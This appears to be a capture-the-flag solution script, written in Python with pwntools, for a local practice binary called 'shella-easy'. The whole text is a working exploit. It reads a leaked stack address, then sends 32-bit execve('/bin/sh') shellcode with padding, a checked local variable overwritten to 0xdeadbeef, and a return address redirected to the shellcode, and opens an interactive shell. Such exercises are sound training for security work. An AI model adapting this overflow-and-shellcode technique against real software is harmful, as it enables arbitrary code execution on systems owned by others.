from pwn import *

target = process("./shella-easy")
target.recvuntil("have a ")
leak = target.recvuntil(" with", drop=True)
input_start_addr = int(leak, 16)
# print(input_start_addr)
shellcode = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
payload = shellcode
input_retaddr_dist = 76
input_localc_dist = 64
localc_desired = 0xdeadbeef
payload += (input_localc_dist - len(shellcode)) * b'A'
payload += p32(localc_desired)
payload += 8 * b'A'
payload += p32(input_start_addr)
# print(input_retaddr_dist - input_localc_dist)
target.sendline(payload)
target.interactive()
